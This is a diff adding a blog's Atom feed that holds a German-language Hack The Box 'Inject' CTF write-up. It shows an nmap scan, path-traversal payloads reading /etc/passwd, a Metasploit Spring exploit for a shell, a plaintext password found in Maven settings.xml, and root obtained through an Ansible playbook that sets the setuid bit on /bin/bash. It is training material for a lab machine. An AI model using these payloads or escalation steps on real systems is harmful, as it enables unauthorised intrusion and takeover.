@@ -1,0 +1,165 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-02T18:31:20+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Florians Blog</title><subtitle>Florians Portfolio und Writeups zu CTF&apos;s.</subtitle><author><name>Florian aka B4M4B0Y</name></author><entry><title type="html">Hack The Box Inject Writeup</title><link href="http://localhost:4000/Hack-The-Box-Inject-Writeup/" rel="alternate" type="text/html" title="Hack The Box Inject Writeup" /><published>2023-08-02T00:00:00+02:00</published><updated>2023-08-02T00:00:00+02:00</updated><id>http://localhost:4000/Hack-The-Box-Inject-Writeup</id><content type="html" xml:base="http://localhost:4000/Hack-The-Box-Inject-Writeup/">&lt;h1 id=&quot;writeup-zur-inject-maschine-von-hack-the-box&quot;&gt;Writeup zur Inject Maschine von Hack The Box&lt;/h1&gt;
+
+&lt;h2 id=&quot;schwierigkeit---easy&quot;&gt;Schwierigkeit - Easy&lt;/h2&gt;
+
+&lt;h2 id=&quot;wir-fangen-an-mit-einem-nmap-scan&quot;&gt;Wir fangen an mit einem nmap-scan&lt;/h2&gt;
+
+&lt;p&gt;Folgender Befehl wird ausgeführt:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -p- -A 10.129.177.49
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;mit -p- scant nmap alle 65 535 Ports&lt;/li&gt;
+  &lt;li&gt;mit -A führen wir einen “agressive-scan” aus, dieser kann ggf. das Betriebssystem des Ziels erkennen, Versionsinformationen zu offenen Ports geben, einige default-Skripte von nmap ausführen und ein traceroute ausführen.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;das-ergebnis-des-nmap-scans-sehen-wir-hier&quot;&gt;Das Ergebnis des nmap-scans sehen wir hier&lt;/h3&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report for 10.129.177.49
+Host is up (0.031s latency).
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
+|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
+|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
+8080/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Wir haben eine Linuxmaschine (Ubuntu) mit zwei offenen Ports. Da die Angriffsfläche von ssh wesentlich geringer als bei einem nagios-nsca ist, konzentrieren wir uns zuerst auf letzteres.&lt;/p&gt;
+
+&lt;h2 id=&quot;weboberfläche&quot;&gt;Weboberfläche&lt;/h2&gt;
+
+&lt;p&gt;Leider habe ich keine Screenshots der Weboberfläche, allerdings war diese statisch und außer der Upload-Funktionalität haben wir keine Möglichkeit der Interaktion mit der Website.
+Wir laden also ein Bild hoch und können dieses unter folgender Adresse wieder ansehen:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.129.177.49/show?img=&amp;lt;name&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;&amp;lt;name&amp;gt; ist hierbei der Name unseres hochgeladenen Bildes.
+Hier sollten wir den Parameter “img” auf jeden Fall auf eine LFI (Local File Inclusion) überprüfen.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;wordlist-für-lfi&quot;&gt;Wordlist für LFI&lt;/h3&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/dotdotpwn.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Obenstehende Wordlist eignet sich sehr gut für das Aufspüren von LFI-Vulnerabilities, da diese sowohl Payloads für Linux als auch für Windows enthält. Zusätzlich enthält sie auch Payloads in allen möglichen Encodings (z.B. URL-Encoded). Die Wahrscheinlichkeit eine LFI zu finden ist mit dieser Wordlist also sehr hoch, sollte eine LFI vorhanden sein.&lt;/p&gt;
+
+&lt;h3 id=&quot;erfolg-mit-lfi&quot;&gt;Erfolg mit LFI&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/inject/lfi.png&quot; alt=&quot;LFI&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Wie man sehen kann, waren wir mit dem einfachen Payload&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;../../../../../../etc/passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;für den Platzhalter &amp;lt;name&amp;gt; erfolgreich. Wir können nun die Benutzer der Maschine sehen.&lt;br /&gt;
+Um nicht manuell alle LFI-Payloads ausprobieren zu müssen, habe ich ffuf verwendet.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffuf -u http://10.129.177.49/show_image?img=FUZZ -w /usr/share/seclists/Fuzzing/LFI/dotdotpwn.txt -mc 200 -replay-proxy http://localhost:8080
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Das Keyword FUZZ gibt die Stelle an, an der gefuzzt werden soll&lt;/li&gt;
+  &lt;li&gt;mit dem Flag -w geben wir die Wordlist an&lt;/li&gt;
+  &lt;li&gt;mit -mc 200 filtern wir nach Responses mit HTTP Statuscode 200&lt;/li&gt;
+  &lt;li&gt;mit -replay-proxy geben wir unseren Proxy (BurpSuite) an, damit wir dort die Responses grafisch sehen und auswerten können&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;lfi-und-wie-geht-es-weiter&quot;&gt;LFI und wie geht es weiter?&lt;/h3&gt;
+
+&lt;p&gt;Nachdem wir mit der LFI die Benutzer “phil” und “frank” in der /etc/passwd Datei ausfindig machen konnten, wird es Zeit die Webanwendung genauer unter die Lupe zu nehmen. Hierzu verwenden wir folgenden Payload&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;../../../../../../var/www
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Üblicherweise können wir mit einer LFI &lt;strong&gt;nicht&lt;/strong&gt; Verzeichnisse auflisten, sondern nur den Inhalt von Dateien anzeigen. Dies war hier allerdings möglich, was typisch für Java-Anwendungen ist.&lt;br /&gt;
+Mit obigem Payload bekommen wir die beiden Verzeichnisse&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;html&lt;/li&gt;
+  &lt;li&gt;WebApp
+angezeigt.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;identifikation-der-schwachstelle&quot;&gt;Identifikation der Schwachstelle&lt;/h3&gt;
+
+&lt;p&gt;Lassen wir uns die Inhalte des WebApp-Verzeichnisses mit der LFI anzeigen, sehen wir unter anderem eine pom.xml Datei und noch weitere Dateien, welche bereits auf eine Java-Anwendung hindeuten.&lt;br /&gt;
+Wir sehen uns den Inhalt der pom.xml Datei an und stellen fest, dass das Springframework der Version 2.6.5 verwendet wird.
+Googeln wir nach “Springframework 2.6.5 exploit” finden wir Ergebnisse für den “Spring4Shell” Exploit&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.rapid7.com/blog/post/2022/03/30/spring4shell-zero-day-vulnerability-in-spring-framework/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Durch diesen Link von rapid7 ist es wahrscheinlich, dass sogar ein Modul für Metasploit verfügbar ist, und tatsächlich ist dies der Fall.&lt;/p&gt;
+
+&lt;h3 id=&quot;ausnutzen-der-schwachstelle&quot;&gt;Ausnutzen der Schwachstelle&lt;/h3&gt;
+
+&lt;p&gt;In der folgenden Abbildung sieht man die erfolgreiche Ausführung des Metasploitmoduls “spring_cloud_function_spel_injection”:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/inject/meterpreter.png&quot; alt=&quot;Foothold&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;benutzer-phil-übernehmen&quot;&gt;Benutzer phil übernehmen&lt;/h3&gt;
+
+&lt;p&gt;Wir haben eine meterpreter-shell als Benutzer frank. Bei der Enumeration der typischen Dateien und Verzeichnisse fällt vor allem das .m2 Verzeichnis in franks Home Verzeichnis auf. Dieses enthält eine settings.xml Datei mit interessanten Informationen.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+&amp;lt;settings xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+        xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
+  &amp;lt;servers&amp;gt;
+    &amp;lt;server&amp;gt;
+      &amp;lt;id&amp;gt;Inject&amp;lt;/id&amp;gt;
+      &amp;lt;username&amp;gt;phil&amp;lt;/username&amp;gt;
+      &amp;lt;password&amp;gt;DocPhillovestoInject123&amp;lt;/password&amp;gt;
+      &amp;lt;privateKey&amp;gt;${user.home}/.ssh/id_dsa&amp;lt;/privateKey&amp;gt;
+      &amp;lt;filePermissions&amp;gt;660&amp;lt;/filePermissions&amp;gt;
+      &amp;lt;directoryPermissions&amp;gt;660&amp;lt;/directoryPermissions&amp;gt;
+      &amp;lt;configuration&amp;gt;&amp;lt;/configuration&amp;gt;
+    &amp;lt;/server&amp;gt;
+  &amp;lt;/servers&amp;gt;
+&amp;lt;/settings&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nun können wir versuchen uns mit ssh anzumelden. Dies schlägt allerdings fehl. Nichtsdestotrotz können wir versuchen zu Benutzer phil zu wechseln mit folgendem Befehl in unserer meterpreter-shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;su phil
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Geben wir nach Aufforderung das Password der settings.xml Datei ein, haben wir erfolgreich zum Benutzer phil gewechselt. In phils Home Verzeichnis befindet sich die erste Flag (user.txt).&lt;/p&gt;
+
+&lt;h3 id=&quot;benutzer-root-übernehmen&quot;&gt;Benutzer root übernehmen&lt;/h3&gt;
+
+&lt;p&gt;Um den Benutzer root zu übernehmen habe ich zuerst linpeas und dann pspy verwendet.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Linpeas ist ein Privilege Escalation Script, welches Vektoren für Privilege Escalation anzeigt.&lt;/li&gt;
+  &lt;li&gt;pspy ist ein Script, mit dem man Prozesse sehen kann, die von anderen Benutzern ausgeführt werden.
+Folgender Ausschnitt des pspy Outputs ist besonders interessant:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CMD: UID=0     PID=315073 | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml
+CMD: UID=0     PID=315175 | /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Der Benutzer mit der UID 0 (root) führt in regelmäßigen Abständen ein ansible playbook aus. Dieses liegt in /opt/automation/tasks/playbook_1.yml. Ebenfalls überschreibt er regelmäßig die Datei mit einer für uns unsichtigen Datei /root/playbook_1.yml. &lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Prüfen wir, ob wir im /opt/automation/tasks Verzeichnis schreiben können:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find /opt -writable 2&amp;gt;/dev/null                                                                          /opt/automation/tasks
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Bingo! Tatsächlich haben wir Schreibberechtigungen mit dem Benutzer phil.
+Nach etwas googlen für Privilege Escalation mit Ansible Playbook finden wir folgenden Inhalt für ein Playbook:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- name: &quot;whatever&quot;
+  hosts: localhost
+  connection: local
+  tasks:
+    - name: &quot;whatever&quot;
+      shell: &quot;chmod +s /bin/bash&quot;
+      register: &quot;output&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Der Link für diesen Payload lautet wie folgt:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Haben wir das playbook_1.yml geändert wie oben, warten wir ein Stück und können eine root-shell erlangen.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/writeups/inject/privesc.png&quot; alt=&quot;Root&quot; /&gt;&lt;/p&gt;</content><author><name>Florian aka B4M4B0Y</name></author><summary type="html">Writeup zur Inject Maschine von Hack The Box</summary></entry></feed>
